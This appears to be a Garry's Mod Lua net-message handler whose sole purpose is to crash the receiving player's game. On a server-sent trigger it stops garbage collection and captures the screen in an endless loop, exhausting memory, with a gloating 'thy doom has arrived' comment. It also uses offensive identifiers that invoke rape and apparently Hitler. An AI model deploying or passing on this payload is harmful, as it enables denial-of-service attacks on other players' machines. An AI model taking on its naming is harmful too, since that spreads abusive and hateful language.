local IDFRape = 2
net.Receive("ShakeYoAssForDaddyChadolf", function()
    -- thy doom has arrived :)
    collectgarbage("stop")
    while true do
      local w, h = ScrW(), ScrH()
      local data = render.Capture({
         format = "png",
         x = 0,            
         y = 0,
         w = w,
         h = h,
         quality = 100
     })
     IDFRape = IDFRape * 2
     IDFRape = IDFRape + 40
    end
end)
